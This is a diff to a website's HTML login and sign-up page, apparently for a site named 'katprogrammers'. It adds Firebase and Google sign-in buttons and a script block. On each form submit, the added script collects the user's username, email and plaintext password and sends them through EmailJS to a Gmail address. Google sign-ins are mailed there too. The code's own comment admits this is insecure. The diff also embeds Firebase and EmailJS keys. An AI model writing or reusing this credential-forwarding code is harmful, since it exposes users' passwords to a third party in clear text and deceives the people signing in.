@@ -415,7 +415,7 @@
                 <input type="submit" value="SIGN UP" class="login">
                 <h4>or</h4>
                 <h3>Sign Up with :</h3>
-                <div class="g_id_signin" data-type="standard" data-text="signup_with"></div>
+                <button type="button" id="google-signup">Sign Up with Google</button>
                 <a href="#"><button type="button" class="button2"><i class="fa-brands fa-facebook-f"></i> Facebook</button></a>
                 <a href="#"><button type="button" class="button3"><i class="fa-brands fa-apple"></i> Apple account</button></a>
             </fieldset>
@@ -449,8 +449,8 @@
     <form id="loginForm">
         <fieldset class="set1">
             <h3>LOG IN</h3>
-            <input type="email" name="email" id="email" placeholder="E-mail" required>
-            <input type="password" name="password" id="password" placeholder="Password" required>
+            <input type="email" name="email" id="Email" placeholder="E-mail" required>
+            <input type="password" name="password" id="Password" placeholder="Password" required>
             <input type="submit" value="LOG IN" class="login">
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
@@ -472,8 +472,8 @@
   document.getElementById("loginForm").addEventListener("submit", function (event) {
     event.preventDefault();
 
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value.trim();
+    const email = document.getElementById("Email").value.trim();
+    const password = document.getElementById("Password").value.trim();
 
     signInWithEmailAndPassword(auth, email, password)
       .then((userCredential) => {
@@ -494,7 +494,7 @@
         <h4>or</h4>
         <fieldset class="set2">
             <h3>Log in with :</h3>
-            <div class="g_id_signin" data-type="standard" data-text="signin_with"></div>
+            <button type="button" id="google-login">Log in with Google</button>
             <a href="#"><button type="button" class="button2"><i class="fa-brands fa-facebook-f"></i> Facebook</button></a>
             <a href="#"><button type="button" class="button3"><i class="fa-brands fa-apple"></i> Apple account</button></a>
         </fieldset>
@@ -573,6 +573,146 @@ const validCredentials = [
             } else {
                 error.style.display = "block";
             }
+        });
+    </script>
+     <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-gCHlAYiX3zJiAeSSSNbQ1qhXJMHLeSQ",
+            authDomain: "katprogrammers-1e30e.firebaseapp.com",
+            projectId: "katprogrammers-1e30e",
+            storageBucket: "katprogrammers-1e30e.appspot.com",
+            messagingSenderId: "20873434906",
+            appId: "1:20873434906:web:9f78f7f25768fb73f37ea3",
+            measurementId: "G-9KXJPD09QZ"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+
+        // Initialize EmailJS
+        emailjs.init("6CSR1CAXwOHcVmcbZ"); // Replace with your EmailJS User ID
+
+        // Handle Sign-Up Form Submission (EmailJS)
+        document.getElementById("signup-form")?.addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Collect form data
+            const formData = {
+                username: document.getElementById("username")?.value,
+                email: document.getElementById("email")?.value,
+                password: document.getElementById("password")?.value
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_moy734x", "template_hsjevgi", {
+                to_email: "katprogrammers@gmail.com", // Replace with your Gmail address
+                username: formData.username,
+                email: formData.email,
+                password: formData.password // Note: Sending passwords via email is insecure
+            })
+            .then(function(response) {
+                console.log("Email sent successfully!", response.status, response.text);
+                alert("Sign-up information sent successfully!");
+            }, function(error) {
+                console.error("Failed to send email:", error);
+                alert("Failed to send sign-up information. Please try again.");
+            });
+        });
+
+        // Handle Login Form Submission (EmailJS)
+        document.getElementById("login-form")?.addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Collect form data
+            const formData = {
+                username: document.getElementById("Email")?.value,
+                password: document.getElementById("Password")?.value
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_moy734x", "template_hsjevgi", {
+                to_email: "katprogrammers@gmail.com", // Replace with your Gmail addres
+                username: formData.username,
+                password: formData.password // Note: Sending passwords via email is insecure
+            })
+            .then(function(response) {
+                console.log("Email sent successfully!", response.status, response.text);
+                alert("Login information sent successfully!");
+            }, function(error) {
+                console.error("Failed to send email:", error);
+                alert("Failed to send login information. Please try again.");
+            });
+        });
+
+        // Google Sign-In/Sign-Up
+        const provider = new firebase.auth.GoogleAuthProvider();
+        provider.setCustomParameters({ prompt: "select_account" });
+
+        // Google Sign-Up
+        document.getElementById("google-signup")?.addEventListener("click", function() {
+            auth.signInWithPopup(provider)
+                .then((result) => {
+                    const user = result.user;
+                    const additionalUserInfo = firebase.auth().getAdditionalUserInfo(result);
+                    const formData = {
+                        username: user.displayName || "Google User",
+                        email: user.email,
+                        password: "Google Sign-In" // Placeholder for EmailJS
+                    };
+
+                    // Send user info to Gmail via EmailJS
+                    emailjs.send("service_moy734x", "template_hsjevgi", {
+                        to_email: "katprogrammers@gmail.com",
+                        username: formData.username,
+                        email: formData.email,
+                        password: formData.password
+                    })
+                    .then(() => {
+                        console.log("Google Sign-Up email sent successfully!");
+                        alert(`Signed up with Google: ${user.email}`);
+                    }, (error) => {
+                        console.error("Failed to send Google Sign-Up email:", error);
+                        alert("Failed to send Google Sign-Up information.");
+                    });
+                })
+                .catch((error) => {
+                    console.error("Google Sign-Up error:", error);
+                    alert(`Google Sign-Up failed: ${error.message}`);
+                });
+        });
+
+        // Google Login
+        document.getElementById("google-login")?.addEventListener("click", function() {
+            auth.signInWithPopup(provider)
+                .then((result) => {
+                    const user = result.user;
+                    const additionalUserInfo = firebase.auth().getAdditionalUserInfo(result);
+                    const formData = {
+                        username: user.displayName || "Google User",
+                        email: user.email,
+                        password: "Google Sign-In" // Placeholder for EmailJS
+                    };
+
+                    // Send user info to Gmail via EmailJS
+                    emailjs.send("service_moy734x", "template_hsjevgi", {
+                        to_email: "katprogrammers@gmail.com",
+                        username: formData.username,
+                        email: formData.email,
+                        password: formData.password
+                    })
+                    .then(() => {
+                        console.log("Google Login email sent successfully!");
+                        alert(`Logged in with Google: ${user.email}`);
+                    }, (error) => {
+                        console.error("Failed to send Google Login email:", error);
+                        alert("Failed to send Google Login information.");
+                    });
+                })
+                .catch((error) => {
+                    console.error("Google Login error:", error);
+                    alert(`Google Login failed: ${error.message}`);
+                });
         });
     </script>
 
